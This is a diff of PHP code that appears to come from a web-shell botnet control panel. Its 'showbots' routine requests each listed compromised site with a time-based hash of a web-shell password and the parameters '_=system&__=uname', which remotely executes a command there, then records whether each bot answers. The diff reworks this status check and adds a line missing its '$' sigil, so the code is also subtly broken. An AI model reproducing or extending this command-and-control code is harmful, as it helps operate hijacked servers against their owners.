@@ -146,15 +146,12 @@ function showbots() {
 		$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
+			statdos = 'OK';
 		} else {
 			$status = 'BAD';
+			$statdos = 'BAD';
 		}
 		
-		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
-   			$statdos = 'OK';
-		} else {
-    		$statdos = 'BAD';
-		}
     
 echo '<tr><td>'.$row["id"].'.</td><td>'.$row["url"].'</td><td>'.$status.'</td><td>'.$statdos.'</td></tr>';
 }
@@ -189,7 +186,7 @@ $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
-$source = conn($row['url'].'?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
 if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $status = 'OK';
 $os = explode("{:|", $source);
